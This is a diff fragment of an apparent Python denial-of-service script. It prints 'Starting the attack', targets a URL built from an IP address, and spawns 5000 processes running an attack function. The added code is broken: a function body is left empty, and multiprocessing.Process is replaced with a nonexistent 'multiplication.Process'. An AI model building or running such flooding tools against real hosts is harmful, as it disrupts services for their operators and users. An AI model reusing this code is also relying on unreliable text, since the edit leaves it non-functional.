@@ -76,9 +76,36 @@ url = f"http://{str(ip)}"
 print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
+def multiplication():
+	global multiple
+	try:
+		multiple = int(input("Insert a number of multiplication"))
+	except ValueError:
+		print("You mistyped, try again.\n")
+		multiplication()
+	begin()
+
+def begin():
+	choice6 = input("Press 'Enter' to start attack: ")
+	if choice6 == "":
+		loop()
+	elif choice6 == "Enter": #lool
+		loop()
+	elif choice6 == "enter": #loool
+		loop()
+	else:
+		exit(0)
+
+def loop():
+	global threads
+	global acceptall
+	global connection
+	global go
+	global x
+
 def send2attack():
   for i in range(5000): #Magic Power
-    mp = multiprocessing.Process(target=attack)
+    mp = multiplication.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
 
